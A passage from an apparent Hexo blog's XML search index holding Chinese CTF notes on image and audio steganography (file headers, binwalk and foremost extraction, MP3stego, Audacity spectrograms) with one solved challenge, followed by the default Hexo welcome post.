    <content type="text"><![CDATA[大鹏一日同风起，扶摇直上九万里一直比较喜欢做杂项（虽然还是很垃圾），就感觉很有意思。总结了一些关于图片隐写的姿势，一起学习~ 1.另存为图片 （还有直接看文件信息，可能就在文件信息里面） 2.改后缀 zip / rar /txt3.扔winhex 这里要看文件头和文件结束的位置 Jpg文件头：FFD8FF，结尾都是FF D9 gif的开头是GIF8（47494638） PNG (png)，文件头：89504E47 ZIP Archive (zip)，文件头：504B0304 RAR Archive (rar)，文件头：52617221 …… 这是一些文件头标志的网站：http://www.cnblogs.com/mq0036/p/3912355.html 4.修复文件 5.分离图片：扔binwalk #binwalk 2.jpg 找到偏移位置 #dd if=2.jpg of=1.jpg skip=偏移位置 bs=1 if是指定输入文件，of是指定输出文件， skip是指定从输入文件开头跳过XXX(140147)个块后再开始复制， bs设置每次读写块的大小为1字节 。 还可以使用foremost 分离命令： #foremost 2.jpg 他会分离之后自己储存到一个ouput的文件夹，里面就有出现的分离图片 6.谷歌识图，百度识图 7.png图片 ①可能还会有图片要拉长一些 ②看低位（stegsolve） 8.base 64 转化成为图片 http://www.tuicool.com/articles/VviyAfY CTF图片隐写术http://www.jianshu.com/p/02fdd5edd9fc CTF隐写总结 （有png相关题目）]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
      <tags>
        <tag>CTF-Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[音频隐写 MP3stego+wav隐写+题目]]></title>
    <url>%2F2017%2F08%2F20%2F%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99-MP3stego-wav%E9%9A%90%E5%86%99-%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[所谓高贵的灵魂，即对自己怀有敬畏之心摘要： 音频隐写，遇见的比较少，这里总结一下我遇见过的一些关于音频隐写的题目，以后遇见其他类型的，再进行补充。 这是最简单的那种&nbsp; 当年年少无知，也不知道很多厉害的姿势，就直接把歌曲输入了网易云，把歌手或者专辑找出来了，然后直接提交flag MP3stego1.知识储备关于MP3stego用法：http://blog.csdn.net/sinat_38134380/article/details/69789665 2.题目分析 1）下载MP3stego 2）将需要分析的mp3文件拖到Decode.exe所在的目录，如 下面的sycgeek-mp3.mp3 3） 开始运行cmd，进入有mp3stego的磁盘 4）-X是获取隐藏的东西 -P后面写密码 5）会在该目录下生成一个新的txt文档sycgeek-mp3.mp3.txt，打开 wav隐写1.知识储备wav隐写-Audacity–silenteye1）-打开wav文件，Audacity-效果-反向-播放2）-Audacity-文件名-频谱图3）-声道里面夹杂着莫斯密码，短的代表’.’,长的代表’-’4）-Audacity-频谱图-attach-点击频谱-然后点击修改spectrogram setting，把8000改为480005）-电话音分析（http://dialabc.com/sound/detect/） 2.相关资源这里再贴上两个有关的wav题目隐写的做法：http://www.sohu.com/a/116298237_468673http://www.hackdig.com/08/hack-38263.htm 3.题目分析下面写一个我自己遇见的关于wav题目的隐写姿势 链接: https://pan.baidu.com/s/1eS7s8iY密码: 53dv 分析此题：首先把这个题扔到Audacity里面，因为很容易就能听出来他有问题，就考虑看一下频谱图（当然还可以看音频轨道、效果、高音、音频波形），考虑是不是数字隐藏。这个题，把中间的灰色的放大放大，放大 emmm ，经过百度，这里有很多种加密，除了上面列举的根据波形图的0 1 加密，摩斯电码加密，我自己在做这个题的时候，还考虑了粗细会不会是表示0 1，还有条形码，经过放大，然后画下来，笔头是个好东西，这是个密码呀~，嘻嘻嘻，很简单了吧，猪圈密码。最后还要考虑一下密码的大小写哦~ 真是个磨人的小妖精~ Flag: D0g3{ahhhhhhhhh}]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
      <tags>
        <tag>CTF-Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2017%2F08%2F18%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
